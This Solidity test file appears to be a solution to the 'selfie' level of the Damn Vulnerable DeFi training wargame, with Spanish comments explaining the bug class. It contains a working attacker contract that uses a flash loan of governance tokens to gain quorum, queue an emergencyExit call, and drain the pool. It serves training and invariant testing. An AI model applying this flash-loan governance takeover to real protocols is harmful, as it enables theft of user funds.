// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

/*
 * NEXUS Offensive · training/dvd · reto "selfie"
 *
 * CLASE DE BUG: poder de voto de gobernanza tomado en préstamo (flash loan).
 *   La gobernanza concede quórum a quien tenga > la mitad del supply de votos
 *   EN ESE INSTANTE. Un flash loan del token de voto da ese quórum por un
 *   bloque: basta pedir prestado, auto-delegarse, encolar una acción maliciosa
 *   (`emergencyExit`) y repagar. Tras el delay, se ejecuta y se drena el pool.
 *
 * FAMILIA: Flash loan / control de acceso (gobernanza).
 *
 * INVARIANTE QUE LO ATRAPA (refuerza la familia Flash Loan):
 *   El quórum de gobernanza no puede alcanzarse con poder de voto prestado:
 *   ninguna cuenta debería superar `totalSupply/2` votos con tokens de un flash
 *   loan. Se sostiene al inicio (nadie tiene quórum) y se rompe durante el
 *   préstamo (el atacante supera la mitad con tokens prestados).
 */
contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        startHoax(deployer);
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(token);
        pool = new SelfiePool(token, governance);
        token.transfer(address(pool), TOKENS_IN_POOL);
        vm.stopPrank();
    }

    function test_selfie() public checkSolvedByPlayer {
        // La invariante se sostiene al inicio: nadie tiene quórum de gobernanza.
        assertLe(token.getVotes(player), token.totalSupply() / 2, "INV debe sostenerse al inicio");

        SelfieAttacker attacker = new SelfieAttacker(pool, governance, token, recovery);
        attacker.attack();

        // Durante el flash loan el atacante alcanzó quórum con tokens PRESTADOS.
        console.log("quorum alcanzado con tokens prestados:", attacker.reachedQuorumWithBorrowed());
        assertTrue(attacker.reachedQuorumWithBorrowed(), "INV rota: quorum con poder de voto prestado");

        // Pasado el delay, se ejecuta la acción encolada y se drena el pool.
        vm.warp(block.timestamp + governance.getActionDelay());
        governance.executeAction(attacker.actionId());
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

/// @notice Atacante: pide prestado el token de voto, se auto-delega, encola la
///         acción maliciosa y repaga, todo en el callback del flash loan.
contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableVotes public token;
    address public recovery;
    uint256 public actionId;
    bool public reachedQuorumWithBorrowed;

    constructor(SelfiePool _pool, SimpleGovernance _gov, DamnValuableVotes _token, address _recovery) {
        pool = _pool;
        governance = _gov;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), amount, "");
    }

    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        token.delegate(address(this)); // activar poder de voto prestado
        reachedQuorumWithBorrowed = token.getVotes(address(this)) > token.totalSupply() / 2;

        actionId = governance.queueAction(
            address(pool), 0, abi.encodeWithSelector(SelfiePool.emergencyExit.selector, recovery)
        );

        token.approve(address(pool), amount); // repago
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
